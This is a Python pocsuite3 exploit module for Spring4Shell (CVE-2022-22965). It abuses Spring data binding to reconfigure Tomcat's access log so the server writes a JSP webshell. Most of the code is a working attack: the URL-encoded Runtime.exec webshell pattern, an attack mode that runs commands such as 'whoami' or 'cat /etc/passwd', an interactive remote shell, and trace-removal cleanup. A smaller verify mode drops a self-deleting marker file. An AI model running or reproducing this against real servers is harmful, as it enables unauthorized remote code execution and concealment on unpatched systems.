#!/usr/bin/env python3
"""
CVE-2022-22965 - Spring4Shell (Spring Core) Remote Code Execution

pocsuite3 PoC. Detects and exploits Spring4Shell via the *verified afrog*
GET-mutation technique:

  1. GET ?class.module.classLoader.resources.context.parent.pipeline.first.*
     reconfigures Tomcat's AccessLogValve so it writes {name}.jsp into
     webapps/ROOT.
  2. _verify drops a MARKER-only JSP: it prints a random token and then
     deletes itself. Verification is the in-band readback of the token —
     ZERO command execution, ZERO webshell content. OOB callbacks
     (Interactsh / self-built service) are deliberately NOT used: the
     binding primitive cannot make the target emit an outbound request,
     the JSP must be fetched by us anyway, so in-band is strictly simpler
     and egress-independent.
  3. _attack/_shell drop the command-exec JSP (Runtime.exec) as before and
     are unchanged.
  4. Cleanup (不留痕): the mutated AccessLogValve is repointed to
     logs/s4s-cleanup-*.log with an empty pattern so no later request
     appends into the dropped .jsp; the verify JSP self-deletes on the
     readback fetch, the attack/shell JSP is deleted via `find -delete`.
     Best-effort, enforced in finally blocks. Known quirks (observed live
     on Tomcat 9, vulhub spring-webmvc:5.3.17):
       - after source deletion Tomcat may keep serving the compiled
         servlet (marker only in _verify) until context reload — harmless
         by construction;
       - run at most ONE drop mode per Tomcat lifetime: after the first
         hijack the valve write path is sticky, and a second drop's exec
         pattern can append into the FIRST drop's path (observed: attack
         after verify turned the earlier marker path into a live shell).
         Restart the target or clean the earlier path between modes.

This GET-based approach is more reliable than the fscan-style POST variant.

Affected: Spring Framework <= 5.3.17 / 5.2.19, JDK 9+, deployed as a WAR on
Tomcat. Spring Boot executable-JAR deployments are NOT vulnerable.

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2022-22965
  - afrog verified PoC: https://github.com/zan8in/afrog-pocs/blob/main/CVE/2022/CVE-2022-22965.yaml
  - https://tanzu.vmware.com/security/cve-2022-22965

NOTE (attack/shell modes): the dropped shell calls Runtime.exec(cmd) directly,
so `cmd` is whitespace-tokenised by Java — NO shell quoting, pipes, or
redirects. Keep commands to simple tokens (e.g. `id`, `cat /etc/passwd`,
`whoami`).
"""

import re
import time
import secrets
import string
import urllib.parse
from collections import OrderedDict

from pocsuite3.api import (
    Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY
)
from pocsuite3.lib.core.interpreter_option import OptString


def randstr(n: int = 8) -> str:
    """Random lowercase+digits filename for the dropped webshell (afrog: randomLowercase(8))."""
    return "".join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(n))


# Tomcat AccessLogValve pattern. Once set, Tomcat writes a JSP webshell.
# %{c2}i / %{c1}i / %{suffix}i are interpolated from request headers c2/c1/suffix.
# URL-encoded exactly as in the verified afrog PoC (do not "clean" it up).
ACCESS_LOG_PATTERN = (
    "%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B"
    "%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec("
    "request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B"
    "%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)"
    "%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di"
)

# /etc/passwd signature (afrog verified matcher): root:x:0:0:
PASSWD_RE = re.compile(rb"root:.*?:[0-9]*:[0-9]*:")

# Marker-only JSP pattern for _verify: prints a random token then deletes the
# source file. Decoded form (with the c2/suffix header interpolation below):
#   <% out.print("<marker>");new java.io.File(application.getRealPath(
#        request.getServletPath())).delete(); %>//
# No Runtime, no exec — the write primitive itself is the proof. Same URL
# encoding style as ACCESS_LOG_PATTERN.
MARKER_PATTERN = (
    "%25%7Bc2%7Di%20out.print(%22{marker}%22)%3Bnew%20java.io.File("
    "application.getRealPath(request.getServletPath())).delete()%3B"
    "%20%25%7Bsuffix%7Di"
)


class CVE202222965POC(POCBase):
    """Spring4Shell (CVE-2022-22965) RCE — afrog GET-mutation technique."""

    pocInfo = {
        'name': 'CVE-2022-22965 Spring4Shell RCE',
        'vulID': 'CVE-2022-22965',
        'author': 'RBKD-SEC',
        'vulType': VUL_TYPE.CODE_EXECUTION,
        'category': POC_CATEGORY.EXPLOITS.WEBAPP,
        'version': '1.1',
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2022-22965',
            'https://github.com/zan8in/afrog-pocs/blob/main/CVE/2022/CVE-2022-22965.yaml',
            'https://tanzu.vmware.com/security/cve-2022-22965',
            'https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/',
        ],
        'appName': 'Spring Framework',
        'appVersion': '<= 5.3.17 / 5.2.19 (JDK 9+, WAR on Tomcat)',
        'desc': '''
            Spring4Shell (CVE-2022-22965): Spring MVC data-binding abuse on JDK 9+
            when deployed as a WAR on Tomcat. Reuses the verified afrog GET-mutation
            technique: reconfigure Tomcat's AccessLogValve via
            class.module.classLoader.resources.context.parent.pipeline.first.* to
            write a JSP into webapps/ROOT. _verify drops a marker-only JSP that
            self-deletes and proves the primitive by in-band marker readback
            (no command execution, no webshell); _attack/_shell drop the
            command-exec JSP. The mutated valve is always repointed to logs/*.log
            and the dropped JSP deleted afterwards (不留痕).
        ''',
        'install_requires': ['requests>=2.20.0'],
    }

    def __init__(self):
        super(CVE202222965POC, self).__init__()
        self.session = None
        self.shell_name = None  # name of the dropped {shell_name}.jsp

    def _options(self):
        opt = OrderedDict()
        opt["command"] = OptString(
            "whoami",
            description="Command for _attack (Runtime.exec tokenised: no shell pipes/quotes/redirects)",
            require=False
        )
        return opt

    # ------------------------------------------------------------------ helpers
    def _init_session(self):
        if not self.session:
            self.session = requests.Session()
            self.session.headers.update({"User-Agent": "Mozilla/5.0"})

    def _drop(self, pattern: str, extra_headers: dict) -> bool:
        """GET mutation -> reconfigure AccessLogValve -> writes {shell_name}.jsp
        with the given pattern. Returns True on HTTP 200."""
        self.shell_name = randstr(8)
        base = self.url.rstrip("/")
        params = (
            "?class.module.classLoader.resources.context.parent.pipeline.first.pattern="
            + pattern
            + "&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"
            + "&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT"
            + "&class.module.classLoader.resources.context.parent.pipeline.first.prefix="
            + self.shell_name
            + "&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
        )
        # Tomcat interpolates the header values into the %{...}i placeholders:
        #   c2 -> "<%"   c1 -> "Runtime" (exec path only)   suffix -> "%>//"
        headers = {"suffix": "%>//", "c2": "<%", "DNT": "1"}
        headers.update(extra_headers)
        # 2-byte body (Content-Length: 2), matching the verified afrog request.
        resp = self.session.get(base + "/" + params, headers=headers, data="xx", timeout=15)
        return resp.status_code == 200

    def _drop_shell(self) -> bool:
        """Drop the command-exec JSP (attack/shell modes)."""
        return self._drop(ACCESS_LOG_PATTERN, {"c1": "Runtime"})

    def _drop_marker(self, marker: str) -> bool:
        """Drop the marker-only self-deleting JSP (verify mode, zero exec)."""
        return self._drop(MARKER_PATTERN.format(marker=marker), {})

    def _fetch_jsp(self):
        """GET the dropped {shell_name}.jsp until it is flushed and compiled.

        Patient on purpose: the access-log line may land just AFTER the drop
        response reaches us, and once Jasper has compiled a partial file it
        keeps serving that failed compile for modificationTestInterval
        (default 4s) before rechecking — so early fetches can 404/500 even
        though the JSP is intact a few seconds later. 5 tries x 2s spans that
        window. Returns body bytes or None."""
        base = self.url.rstrip("/")
        url = "{}/{}.jsp".format(base, self.shell_name)
        for attempt in range(5):
            if attempt:
                time.sleep(2.0)
            try:
                resp = self.session.get(url, timeout=20)
                if resp.status_code == 200 and resp.content:
                    return resp.content
            except Exception as e:  # noqa
                logger.debug("jsp fetch error: %s" % str(e))
        return None

    def _restore_valve(self) -> bool:
        """Empty the mutated AccessLogValve pattern (best-effort).

        Honest mechanics (verified against Tomcat 9): the in-memory pattern
        becomes empty, so NO later request — even an attacker-crafted one —
        can append executable `<%` text into the poisoned path again. But
        Tomcat keeps writing to the still-open old file handle (a new
        logs/s4s-cleanup-*.log may only appear after rotation/restart), and
        the file itself only disappears once the JSP's File.delete() ran;
        after that the handle writes into a deleted inode. Net on-disk
        residue: none visible."""
        base = self.url.rstrip("/")
        params = (
            "?class.module.classLoader.resources.context.parent.pipeline.first.pattern="
            + "&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.log"
            + "&class.module.classLoader.resources.context.parent.pipeline.first.directory=logs"
            + "&class.module.classLoader.resources.context.parent.pipeline.first.prefix=s4s-cleanup-"
            + randstr(6)
            + "&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
        )
        try:
            resp = self.session.get(base + "/" + params, headers={"DNT": "1"}, data="xx", timeout=15)
            return resp.status_code == 200
        except Exception as e:  # noqa
            logger.debug("valve restore error: %s" % str(e))
            return False

    def _exec(self, command: str):
        """Step 2: execute a command via the dropped webshell. Returns body bytes or None.

        Patient retry, two overlapping windows observed live on Tomcat 9:
        (a) the access-log flush lands just after the drop response and Jasper
        keeps a failed partial-file compile for modificationTestInterval
        (default 4s); (b) Runtime.exec itself can take >10s on slow/emulated
        targets — the JSP answers 200 with an EMPTY body until the process
        produces output. So: retry on 404/500 AND on 200-with-empty-body.
        12x3.5s (~42s) covers the worst emulated-hardware latency observed
        live (up to ~30s); native targets answer in milliseconds."""
        base = self.url.rstrip("/")
        url = "{}/{}.jsp?pwd=j&cmd={}".format(base, self.shell_name, urllib.parse.quote(command))
        for attempt in range(12):
            if attempt:
                time.sleep(3.5)
            try:
                resp = self.session.get(url, timeout=20)
                if resp.status_code == 200 and resp.content:
                    return resp.content
            except Exception as e:  # noqa
                logger.debug("exec request error: %s" % str(e))
        return None

    def _cleanup(self):
        """Delete the dropped webshell (不留痕). Best-effort, never raises."""
        if not self.shell_name:
            return
        try:
            # repoint the valve BEFORE deleting so no later request re-appends
            # the log line into (and resurrects) the .jsp
            self._restore_valve()
            # find by the unique random name and delete; Runtime.exec-tokenisation safe
            # (whitespace-free tokens, no shell quoting / glob / redirection needed).
            self._exec("find / -name %s.jsp -delete" % self.shell_name)
            # confirm removal (expect 404)
            base = self.url.rstrip("/")
            check = self.session.get("{}/{}.jsp".format(base, self.shell_name), timeout=8)
            if check.status_code == 404:
                logger.info("cleanup ok: %s.jsp removed" % self.shell_name)
            else:
                    # 200 here is usually Tomcat still serving the COMPILED
                    # servlet after source deletion (no recompile without a
                    # source file), not the file itself — verify manually if
                    # certainty is required.
                    logger.warning("cleanup check status=%s for %s.jsp — likely compiled-servlet echo; "
                                   "manual verification advised" % (check.status_code, self.shell_name))
        except Exception as e:  # noqa
            logger.warning("cleanup error (manual removal advised): %s" % str(e))

    # --------------------------------------------------------------------- modes
    def _verify(self):
        """Verify with ZERO command execution: drop a marker-only JSP, read the
        random marker back in-band. The marker proves the AccessLogValve write
        primitive (the CVE root); no Runtime.exec, no webshell content."""
        output = Output(self)
        self._init_session()
        marker = randstr(12)
        try:
            if not self._drop_marker(marker):
                output.fail("AccessLogValve mutation did not return HTTP 200; target likely not vulnerable")
                return output
            content = self._fetch_jsp()
            if content and marker.encode() in content:
                logger.info("target is vulnerable to CVE-2022-22965 (marker echoed)")
                result = {
                    'VerifyInfo': {
                        'URL': self.url,
                        'VulType': VUL_TYPE.CODE_EXECUTION,
                        'Payload': 'GET class.module.classLoader...pipeline.first -> marker JSP -> in-band marker readback',
                    },
                    'Extra': {
                        'evidence': 'self-deleting marker JSP %s.jsp echoed marker %s (no command executed)'
                                    % (self.shell_name, marker),
                    },
                }
                output.success(result)
                return output
            output.fail("marker JSP dropped but marker not echoed (patched, non-Tomcat-WAR, or JSP not flushed)")
            return output
        finally:
            # zero-exec cleanup: repoint the valve first (no further .jsp
            # appends), then one more fetch so the in-page File.delete() runs
            # without the valve recreating the file afterwards.
            self._restore_valve()
            self._fetch_jsp()

    def _attack(self):
        """Attack: drop shell, execute the configured command, return output."""
        output = Output(self)
        self._init_session()
        command = self.get_option("command") or "whoami"
        try:
            if not self._drop_shell():
                output.fail("AccessLogValve mutation did not return HTTP 200; target likely not vulnerable")
                return output
            content = self._exec(command)
            if content is None:
                output.fail("failed to execute command: %s" % command)
                return output
            text = content.decode("utf-8", "ignore")
            logger.info("command executed: %s" % command)
            result = {
                'ShellInfo': {'URL': self.url, 'Command': command},
                'Extra': {'output': text[:500] + ("..." if len(text) > 500 else "")},
            }
            output.success(result)
            return output
        finally:
            self._cleanup()

    def _shell(self):
        """Interactive shell: drop shell once, loop commands, cleanup on exit."""
        self._init_session()
        if not self._drop_shell():
            logger.error("AccessLogValve mutation failed; cannot establish shell")
            return
        print("\n" + "=" * 60)
        print("Spring4Shell RCE shell - CVE-2022-22965 @ %s" % self.url)
        print("Runtime.exec tokenised: NO shell pipes/quotes/redirects.")
        print("type 'exit' to quit (webshell is auto-deleted).")
        print("=" * 60 + "\n")
        try:
            while True:
                try:
                    cmd = input("\033[91mspring4shell\033[0m@{}> ".format(self.rhost)).strip()
                except (EOFError, KeyboardInterrupt):
                    print("\nExiting shell...")
                    break
                if not cmd or cmd.lower() == "exit":
                    break
                content = self._exec(cmd)
                if content:
                    print(content.decode("utf-8", "ignore"))
                else:
                    logger.error("command returned no output: %s" % cmd)
        finally:
            self._cleanup()


register_poc(CVE202222965POC)
